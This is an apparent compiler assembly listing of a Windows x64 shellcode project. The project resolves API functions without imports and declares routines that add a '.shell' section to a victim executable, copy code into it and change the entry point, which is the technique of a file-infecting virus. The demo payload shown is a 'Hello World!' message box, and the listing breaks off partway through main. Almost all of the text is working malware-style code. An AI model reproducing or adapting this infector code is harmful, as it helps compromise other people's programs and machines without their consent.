; Listing generated by Microsoft (R) Optimizing Compiler Version 19.41.34123.0 

include listing.inc


PUBLIC	?kernel32_str@@3PA_WA				; kernel32_str
PUBLIC	?load_lib_str@@3PADA				; load_lib_str
PUBLIC	?kernel32_dll_name@@3PA_WA			; kernel32_dll_name
PUBLIC	?load_lib_name@@3PADA				; load_lib_name
PUBLIC	?get_proc_name@@3PADA				; get_proc_name
PUBLIC	?kr32_dll_name@@3PADA				; kr32_dll_name
PUBLIC	?user32_dll_name@@3PADA				; user32_dll_name
PUBLIC	?ucrtbase_dll_name@@3PADA			; ucrtbase_dll_name
PUBLIC	?message_box_name@@3PADA			; message_box_name
PUBLIC	?cf_name@@3PADA					; cf_name
PUBLIC	?rf_name@@3PADA					; rf_name
PUBLIC	?close_handle_name@@3PADA			; close_handle_name
PUBLIC	?mb_to_wc_name@@3PADA				; mb_to_wc_name
PUBLIC	?strncmp_name@@3PADA				; strncmp_name
PUBLIC	?get_file_size_name@@3PADA			; get_file_size_name
PUBLIC	?map_view_of_file_name@@3PADA			; map_view_of_file_name
PUBLIC	?unmap_view_of_file_name@@3PADA			; unmap_view_of_file_name
PUBLIC	?create_file_mapping_name@@3PADA		; create_file_mapping_name
PUBLIC	?msg_content@@3PA_WA				; msg_content
PUBLIC	?msg_title@@3PA_WA				; msg_title
PUBLIC	?fileName@@3PADA				; fileName
PUBLIC	?fileName_vic@@3PADA				; fileName_vic
PUBLIC	?func_name@@3PADA				; func_name
PUBLIC	?buffer@@3PADA					; buffer
PUBLIC	?bytesRead@@3KA					; bytesRead
PUBLIC	?wide_buffer@@3PA_WA				; wide_buffer
PUBLIC	?malloc_name@@3PADA				; malloc_name
PUBLIC	?memcpy_name@@3PADA				; memcpy_name
_BSS	SEGMENT
?buffer@@3PADA DB 040H DUP (?)				; buffer
?bytesRead@@3KA DD 01H DUP (?)				; bytesRead
?wide_buffer@@3PA_WA DW 040H DUP (?)			; wide_buffer
_BSS	ENDS
CONST	SEGMENT
$SG90576 DB	'.shell', 00H
	ORG $+1
$SG90604 DB	'.text', 00H
	ORG $+2
$SG90807 DB	'strcpy_s', 00H
	ORG $+7
$SG90809 DB	'ZeroMemory', 00H
	ORG $+5
$SG90810 DB	'SetFilePointer', 00H
	ORG $+1
$SG90811 DB	'SetEndOfFile', 00H
	ORG $+3
$SG90816 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90817 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, 00H
	DB	00H
	ORG $+4
$SG90822 DB	'C', 00H, 'o', 00H, 'n', 00H, 't', 00H, 'e', 00H, 'n', 00H
	DB	'i', 00H, 'd', 00H, 'o', 00H, ' ', 00H, 'd', 00H, 'e', 00H, 'l'
	DB	00H, ' ', 00H, 'A', 00H, 'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H
	DB	'v', 00H, 'o', 00H, 00H, 00H
	ORG $+4
$SG90823 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90824 DB	'N', 00H, 'o', 00H, ' ', 00H, 's', 00H, 'e', 00H, ' ', 00H
	DB	'p', 00H, 'u', 00H, 'd', 00H, 'o', 00H, ' ', 00H, 'l', 00H, 'e'
	DB	00H, 'e', 00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H
	DB	'a', 00H, 'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o'
	DB	00H, 00H, 00H
	ORG $+2
$SG90825 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90826 DB	'_', 00H, 'C', 00H, 'l', 00H, 'o', 00H, 's', 00H, 'e', 00H
	DB	'H', 00H, 'a', 00H, 'n', 00H, 'd', 00H, 'l', 00H, 'e', 00H, '('
	DB	00H, 'h', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ')', 00H
	DB	00H, 00H
$SG90827 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90828 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, 00H
	DB	00H
	ORG $+4
$SG90830 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90831 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, 00H
	DB	00H
	ORG $+4
$SG90832 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90833 DB	'_', 00H, 'C', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 't', 00H
	DB	'e', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, 'A', 00H, 00H
	DB	00H
	ORG $+6
$SG90834 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90835 DB	'G', 00H, 'e', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, '(', 00H, 'h'
	DB	00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ',', 00H, ' ', 00H
	DB	'N', 00H, 'U', 00H, 'L', 00H, 'L', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90837 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90838 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'c', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'i', 00H, 'n'
	DB	00H, 'g', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l', 00H, 'e', 00H
	DB	' ', 00H, 'm', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H, 'n'
	DB	00H, 'g', 00H, '.', 00H, 00H, 00H
	ORG $+6
$SG90839 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90840 DB	'G', 00H, 'e', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, '(', 00H, 'h'
	DB	00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ',', 00H, ' ', 00H
	DB	'N', 00H, 'U', 00H, 'L', 00H, 'L', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90842 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90843 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'm', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H, 'n', 00H, 'g'
	DB	00H, ' ', 00H, 'v', 00H, 'i', 00H, 'e', 00H, 'w', 00H, ' ', 00H
	DB	'o', 00H, 'f', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l', 00H, 'e'
	DB	00H, '.', 00H, '.', 00H, 00H, 00H
	ORG $+6
$SG90844 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90845 DB	'M', 00H, 'a', 00H, 'p', 00H, 'V', 00H, 'i', 00H, 'e', 00H
	DB	'w', 00H, 'O', 00H, 'f', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e'
	DB	00H, '(', 00H, 'h', 00H, 'M', 00H, 'a', 00H, 'p', 00H, 'p', 00H
	DB	'i', 00H, 'n', 00H, 'g', 00H, ',', 00H, ' ', 00H, 'F', 00H, 'I'
	DB	00H, 'L', 00H, 'E', 00H, '_', 00H, 'M', 00H, 'A', 00H, 'P', 00H
	DB	'_', 00H, 'R', 00H, 'E', 00H, 'A', 00H, 'D', 00H, ',', 00H, ' '
	DB	00H, '0', 00H, ',', 00H, ' ', 00H, '0', 00H, ',', 00H, ' ', 00H
	DB	'0', 00H, ')', 00H, 00H, 00H
$SG90848 DB	'A', 00H, 'v', 00H, 'i', 00H, 's', 00H, 'o', 00H, 00H, 00H
	ORG $+4
$SG90849 DB	'S', 00H, 'e', 00H, 'c', 00H, 'c', 00H, 'i', 00H, 0f3H, 00H
	DB	'n', 00H, ' ', 00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't'
	DB	00H, ' ', 00H, 'e', 00H, 'n', 00H, 'c', 00H, 'o', 00H, 'n', 00H
	DB	't', 00H, 'r', 00H, 'a', 00H, 'd', 00H, 'a', 00H, '.', 00H, ' '
	DB	00H, ' ', 00H, 00H, 00H
$SG90850 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+12
$SG90851 DB	'N', 00H, 'o', 00H, ' ', 00H, 's', 00H, 'e', 00H, ' ', 00H
	DB	'e', 00H, 'n', 00H, 'c', 00H, 'o', 00H, 'n', 00H, 't', 00H, 'r'
	DB	00H, 0f3H, 00H, ' ', 00H, 'l', 00H, 'a', 00H, ' ', 00H, 's', 00H
	DB	'e', 00H, 'c', 00H, 'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, ' '
	DB	00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't', 00H, '.', 00H
	DB	00H, 00H
	ORG $+6
$SG90852 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90853 DB	'G', 00H, 'e', 00H, 't', 00H, 'T', 00H, 'e', 00H, 'x', 00H
	DB	't', 00H, 'S', 00H, 'e', 00H, 'c', 00H, 't', 00H, 'i', 00H, 'o'
	DB	00H, 'n', 00H, '(', 00H, 'e', 00H, 'x', 00H, 'e', 00H, 'B', 00H
	DB	'a', 00H, 's', 00H, 'e', 00H, ',', 00H, ' ', 00H, '&', 00H, 's'
	DB	00H, 'e', 00H, 'c', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H
	DB	'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, ',', 00H, ' ', 00H, 's'
	DB	00H, 't', 00H, 'r', 00H, 'n', 00H, 'c', 00H, 'm', 00H, 'p', 00H
	DB	'_', 00H, 'f', 00H, 'u', 00H, 'n', 00H, 'c', 00H, ')', 00H, 00H
	DB	00H
$SG90854 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90855 DB	'U', 00H, 'n', 00H, 'm', 00H, 'a', 00H, 'p', 00H, 'V', 00H
	DB	'i', 00H, 'e', 00H, 'w', 00H, 'O', 00H, 'f', 00H, 'F', 00H, 'i'
	DB	00H, 'l', 00H, 'e', 00H, '(', 00H, 'e', 00H, 'x', 00H, 'e', 00H
	DB	'B', 00H, 'a', 00H, 's', 00H, 'e', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90856 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90857 DB	'_', 00H, 'C', 00H, 'l', 00H, 'o', 00H, 's', 00H, 'e', 00H
	DB	'H', 00H, 'a', 00H, 'n', 00H, 'd', 00H, 'l', 00H, 'e', 00H, '('
	DB	00H, 'h', 00H, 'M', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H
	DB	'n', 00H, 'g', 00H, ')', 00H, 00H, 00H
	ORG $+2
$SG90858 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90859 DB	'_', 00H, 'C', 00H, 'l', 00H, 'o', 00H, 's', 00H, 'e', 00H
	DB	'H', 00H, 'a', 00H, 'n', 00H, 'd', 00H, 'l', 00H, 'e', 00H, '('
	DB	00H, 'h', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ')', 00H
	DB	00H, 00H
$SG90861 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90862 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, ' '
	DB	00H, 'v', 00H, 'i', 00H, 'c', 00H, 00H, 00H
	ORG $+4
$SG90863 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90864 DB	'_', 00H, 'C', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 't', 00H
	DB	'e', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, 'A', 00H, '('
	DB	00H, '2', 00H, 'x', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90867 DB	0c9H, 00H, 'x', 00H, 'i', 00H, 't', 00H, 'o', 00H, 00H, 00H
	ORG $+4
$SG90868 DB	'C', 00H, 'o', 00H, 'n', 00H, 't', 00H, 'e', 00H, 'n', 00H
	DB	'i', 00H, 'd', 00H, 'o', 00H, ' ', 00H, 'd', 00H, 'e', 00H, ' '
	DB	00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't', 00H, ' ', 00H
	DB	'c', 00H, 'o', 00H, 'p', 00H, 'i', 00H, 'a', 00H, 'd', 00H, 'o'
	DB	00H, ' ', 00H, 'a', 00H, ' ', 00H, '.', 00H, 's', 00H, 'h', 00H
	DB	'e', 00H, 'l', 00H, 'l', 00H, 00H, 00H
$SG90869 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+12
$SG90870 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'c', 00H, 'o', 00H, 'p', 00H, 'i'
	DB	00H, 'a', 00H, 'r', 00H, ' ', 00H, 'l', 00H, 'a', 00H, ' ', 00H
	DB	's', 00H, 'e', 00H, 'c', 00H, 'c', 00H, 'i', 00H, 0f3H, 00H, 'n'
	DB	00H, ' ', 00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't', 00H
	DB	00H, 00H
CONST	ENDS
_DATA	SEGMENT
?kernel32_dll_name@@3PA_WA DW 06bH			; kernel32_dll_name
	DW	065H
	DW	072H
	DW	06eH
	DW	065H
	DW	06cH
	DW	033H
	DW	032H
	DW	02eH
	DW	064H
	DW	06cH
	DW	06cH
	DW	00H
	ORG $+6
?load_lib_name@@3PADA DB 04cH				; load_lib_name
	DB	06fH
	DB	061H
	DB	064H
	DB	04cH
	DB	069H
	DB	062H
	DB	072H
	DB	061H
	DB	072H
	DB	079H
	DB	041H
	DB	00H
	ORG $+3
?get_proc_name@@3PADA DB 047H				; get_proc_name
	DB	065H
	DB	074H
	DB	050H
	DB	072H
	DB	06fH
	DB	063H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+1
?kr32_dll_name@@3PADA DB 06bH				; kr32_dll_name
	DB	065H
	DB	072H
	DB	06eH
	DB	065H
	DB	06cH
	DB	033H
	DB	032H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	DB	00H
	ORG $+3
?user32_dll_name@@3PADA DB 075H				; user32_dll_name
	DB	073H
	DB	065H
	DB	072H
	DB	033H
	DB	032H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	DB	00H
	ORG $+5
?ucrtbase_dll_name@@3PADA DB 075H			; ucrtbase_dll_name
	DB	063H
	DB	072H
	DB	074H
	DB	062H
	DB	061H
	DB	073H
	DB	065H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	ORG $+4
?message_box_name@@3PADA DB 04dH			; message_box_name
	DB	065H
	DB	073H
	DB	073H
	DB	061H
	DB	067H
	DB	065H
	DB	042H
	DB	06fH
	DB	078H
	DB	057H
	DB	00H
	ORG $+4
?cf_name@@3PADA DB 043H					; cf_name
	DB	072H
	DB	065H
	DB	061H
	DB	074H
	DB	065H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	041H
	DB	00H
	ORG $+4
?rf_name@@3PADA DB 052H					; rf_name
	DB	065H
	DB	061H
	DB	064H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+7
?close_handle_name@@3PADA DB 043H			; close_handle_name
	DB	06cH
	DB	06fH
	DB	073H
	DB	065H
	DB	048H
	DB	061H
	DB	06eH
	DB	064H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+4
?mb_to_wc_name@@3PADA DB 04dH				; mb_to_wc_name
	DB	075H
	DB	06cH
	DB	074H
	DB	069H
	DB	042H
	DB	079H
	DB	074H
	DB	065H
	DB	054H
	DB	06fH
	DB	057H
	DB	069H
	DB	064H
	DB	065H
	DB	043H
	DB	068H
	DB	061H
	DB	072H
	DB	00H
	ORG $+4
?strncmp_name@@3PADA DB 073H				; strncmp_name
	DB	074H
	DB	072H
	DB	06eH
	DB	063H
	DB	06dH
	DB	070H
	DB	00H
?get_file_size_name@@3PADA DB 047H			; get_file_size_name
	DB	065H
	DB	074H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	053H
	DB	069H
	DB	07aH
	DB	065H
	DB	00H
	ORG $+4
?map_view_of_file_name@@3PADA DB 04dH			; map_view_of_file_name
	DB	061H
	DB	070H
	DB	056H
	DB	069H
	DB	065H
	DB	077H
	DB	04fH
	DB	066H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+2
?unmap_view_of_file_name@@3PADA DB 055H			; unmap_view_of_file_name
	DB	06eH
	DB	06dH
	DB	061H
	DB	070H
	DB	056H
	DB	069H
	DB	065H
	DB	077H
	DB	04fH
	DB	066H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
?create_file_mapping_name@@3PADA DB 043H		; create_file_mapping_name
	DB	072H
	DB	065H
	DB	061H
	DB	074H
	DB	065H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	04dH
	DB	061H
	DB	070H
	DB	070H
	DB	069H
	DB	06eH
	DB	067H
	DB	041H
	DB	00H
	ORG $+5
?msg_content@@3PA_WA DW 048H				; msg_content
	DW	065H
	DW	06cH
	DW	06cH
	DW	06fH
	DW	020H
	DW	057H
	DW	06fH
	DW	072H
	DW	06cH
	DW	064H
	DW	021H
	DW	00H
	ORG $+6
?msg_title@@3PA_WA DW 044H				; msg_title
	DW	065H
	DW	06dH
	DW	06fH
	DW	021H
	DW	00H
	ORG $+4
?fileName@@3PADA DB 063H				; fileName
	DB	02dH
	DB	073H
	DB	068H
	DB	065H
	DB	06cH
	DB	06cH
	DB	063H
	DB	06fH
	DB	064H
	DB	065H
	DB	02eH
	DB	065H
	DB	078H
	DB	065H
	DB	00H
?fileName_vic@@3PADA DB 079H				; fileName_vic
	DB	075H
	DB	073H
	DB	06bH
	DB	06fH
	DB	076H
	DB	069H
	DB	063H
	DB	02eH
	DB	065H
	DB	078H
	DB	065H
	DB	00H
	ORG $+3
?func_name@@3PADA DB 073H				; func_name
	DB	074H
	DB	072H
	DB	06eH
	DB	063H
	DB	06dH
	DB	070H
	DB	00H
?malloc_name@@3PADA DB 06dH				; malloc_name
	DB	061H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	00H
	ORG $+1
?memcpy_name@@3PADA DB 06dH				; memcpy_name
	DB	065H
	DB	06dH
	DB	063H
	DB	070H
	DB	079H
	DB	00H
_DATA	ENDS
_TEXT	SEGMENT
?load_lib_str@@3PADA DB 'LoadLibraryA', 00H		; load_lib_str
	ORG $+3
?kernel32_str@@3PA_WA DB 'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H
	DB	'l', 00H, '3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; kernel32_str
_TEXT	ENDS
PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	?CopyTextToShell@@YA_NPEAXKP6APEAX_K@ZP6APEAX0PEBX1@Z@Z ; CopyTextToShell
PUBLIC	?AddShellSectionAndModifyEntryPoint@@YA_NPEAXP6AH0@ZP6AHPEBX@ZP6APEAX0PEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZP6APEAX0KKK_K@ZP6AHPEAD75@ZP6AX07@ZP6AK0JPEAJK@Z1@Z ; AddShellSectionAndModifyEntryPoint
PUBLIC	?ALIGN_UP@@YAKKK@Z				; ALIGN_UP
PUBLIC	?GetTextSection@@YAPEAXPEAXPEAKP6AHPEBD2_K@Z@Z	; GetTextSection
PUBLIC	main

;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	014H
voltbl	ENDS

; Function compile flags: /Odtp
_TEXT	SEGMENT


; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm

; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
; to calling the entry point of the payload. This is necessary because 64-bit functions
; in Windows assume that they were called with 16-byte stack alignment. When amd64
; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
; alignment.

AlignRSP PROC
    push rsi ; Preserve RSI since we're stomping on it
    mov rsi, rsp ; Save the value of RSP so it can be restored
    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
    sub rsp, 020h ; Allocate homing space for ExecutePayloadd
    call main ; Call the entry point of the payload
    mov rsp, rsi ; Restore the original value of RSP
    pop rsi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP

_MessageBoxW$ = 80
_GetProcAddress$ = 88
k32_dll$ = 96
hFile$ = 104
_CloseHandle$ = 112
AddedEntryPoint$ = 120
sectionSize$ = 124
exeBase$ = 128
hMapping$ = 136
_CreateFileA$ = 144
_UnmapViewOfFile$ = 152
hLibC$ = 160
result$1 = 168
hFile_vic$ = 176
base$ = 184
_LoadLibraryA$ = 192
_MapViewOfFile$ = 200
_CreateFileMappingA$ = 208
load_lib$ = 216
get_proc$ = 224
_ReadFile$ = 232
_GetFileSize$ = 240
_strncmp$ = 248
_SetEndOfFile$ = 256
_strcpy_s$ = 264
_memcpy$ = 272
_malloc$ = 280
fileSize$ = 288
u32_dll$ = 296
_MultiByteToWideChar$ = 304
textSection$ = 312
_SetFilePointer$ = 320
_ZeroMemory$ = 328
wideBuffer$2 = 336
main	PROC
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 250
$LN29:
	push	rdi
	sub	rsp, 464				; 000001d0H
; Line 252
	lea	rcx, OFFSET ?kernel32_dll_name@@3PA_WA ; kernel32_dll_name
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 253
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN2@main
; Line 254
	mov	eax, 1
	jmp	$LN1@main
$LN2@main:
; Line 258
	lea	rdx, OFFSET ?load_lib_name@@3PADA	; load_lib_name
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 259
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN3@main
; Line 260
	mov	eax, 2
	jmp	$LN1@main
$LN3@main:
; Line 264
	lea	rdx, OFFSET ?get_proc_name@@3PADA	; get_proc_name
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 265
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN4@main
; Line 266
	mov	eax, 3
	jmp	$LN1@main
$LN4@main:
; Line 270
	mov	rax, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR _LoadLibraryA$[rsp], rax
; Line 272
	mov	rax, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR _GetProcAddress$[rsp], rax
; Line 275
	lea	rcx, OFFSET ?user32_dll_name@@3PADA ; user32_dll_name
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR u32_dll$[rsp], rax
; Line 277
	lea	rcx, OFFSET ?kr32_dll_name@@3PADA	; kr32_dll_name
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR k32_dll$[rsp], rax
; Line 279
	lea	rcx, OFFSET ?ucrtbase_dll_name@@3PADA ; ucrtbase_dll_name
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR hLibC$[rsp], rax
; Line 284
	lea	rdx, OFFSET ?get_file_size_name@@3PADA ; get_file_size_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _GetFileSize$[rsp], rax
; Line 293
	lea	rdx, OFFSET ?map_view_of_file_name@@3PADA ; map_view_of_file_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _MapViewOfFile$[rsp], rax
; Line 298
	lea	rdx, OFFSET ?unmap_view_of_file_name@@3PADA ; unmap_view_of_file_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _UnmapViewOfFile$[rsp], rax
; Line 308
	lea	rdx, OFFSET ?create_file_mapping_name@@3PADA ; create_file_mapping_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _CreateFileMappingA$[rsp], rax
; Line 312
	cmp	QWORD PTR _GetFileSize$[rsp], 0
	je	SHORT $LN6@main
	cmp	QWORD PTR _MapViewOfFile$[rsp], 0
	je	SHORT $LN6@main
	cmp	QWORD PTR _UnmapViewOfFile$[rsp], 0
	je	SHORT $LN6@main
	cmp	QWORD PTR _CreateFileMappingA$[rsp], 0
	jne	SHORT $LN5@main
$LN6@main:
; Line 314
	mov	eax, -1
	jmp	$LN1@main
$LN5@main:
; Line 324
	lea	rdx, OFFSET ?cf_name@@3PADA	; cf_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _CreateFileA$[rsp], rax
; Line 334
	cmp	QWORD PTR _CreateFileA$[rsp], -1
	jne	SHORT $LN7@main
	mov	eax, 3
	jmp	$LN1@main
$LN7@main:
; Line 344
	lea	rdx, OFFSET ?rf_name@@3PADA	; rf_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _ReadFile$[rsp], rax
; Line 351
	cmp	QWORD PTR _ReadFile$[rsp], 0
	jne	SHORT $LN8@main
	mov	eax, 4
	jmp	$LN1@main
$LN8@main:
; Line 358
	lea	rdx, OFFSET ?message_box_name@@3PADA ; message_box_name
	mov	rcx, QWORD PTR u32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _MessageBoxW$[rsp], rax
; Line 364
